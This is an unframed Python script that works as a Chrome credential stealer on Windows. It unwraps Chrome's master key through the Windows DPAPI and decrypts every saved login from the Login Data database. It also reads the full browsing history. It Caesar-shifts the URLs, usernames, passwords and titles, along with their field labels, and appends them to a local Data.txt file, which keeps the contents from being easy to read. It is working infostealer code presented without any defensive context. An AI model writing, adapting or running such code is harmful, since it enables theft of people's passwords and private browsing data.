import os, sqlite3, json, base64, win32crypt
from Crypto.Cipher import AES

def encrypt(text):
    result = ""

    for i in range(len(text)):
        char = text[i]

        if (char.isupper()):
            result += chr((ord(char) + 10 - 65) % 26 + 65)

        elif(char.islower()):
            result += chr((ord(char) + 10 - 97) % 26 + 97)

        else:
            result += char

    return result


def decrypt_password(buff):
    local_statePath = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

    with open(local_statePath, 'r', encoding = 'utf-8') as f:
        local_stateData = f.read()
        local_stateData = json.loads(local_stateData)

    chromeVersion = local_stateData["browser"]["shortcut_migration_version"]

    if int(chromeVersion[0]) > 7:
        master_key = base64.b64decode(local_stateData["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(payload)
        decrypted_password = decrypted_password[:-16].decode()
        return decrypted_password
    
    else:
        return win32crypt.CryptUnprotectData(buff[2], None, None, None, 0)[1]

Login_data = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
connection = sqlite3.connect(Login_data)
cursor = connection.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
finalLogin_data = cursor.fetchall()

for chrome_logins in finalLogin_data:
    website = encrypt(str(chrome_logins[0]))
    username = encrypt(str(chrome_logins[1]))
    password = encrypt(decrypt_password(chrome_logins[2]))

    txtFile = open('Data.txt', 'a')
    txtFile.write(f"Golcsdo - { website }\n")
    txtFile.write(f"Ecobxkwo - { username }\n")
    txtFile.write(f"Zkccgybn - { password }\n")
    txtFile.write("\n")
    txtFile.close()

History_Data = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
con = sqlite3.connect(History_Data)
cur = con.cursor()
cur.execute('select url, title from urls')
finalHistory_Data = cur.fetchall()

for chrome_history in finalHistory_Data:
    website = encrypt(str(chrome_history[0]))
    title = encrypt(str(chrome_history[1]))

    txtFile = open('Data.txt', 'a', encoding="utf-8")
    txtFile.write(f"Golcsdo EBV - { website }")
    txtFile.write("\n")
    txtFile.write(f"Golcsdo Dsdvo - { title }")
    txtFile.write("\n")
    txtFile.close()
    
cursor.close()
con.close() 
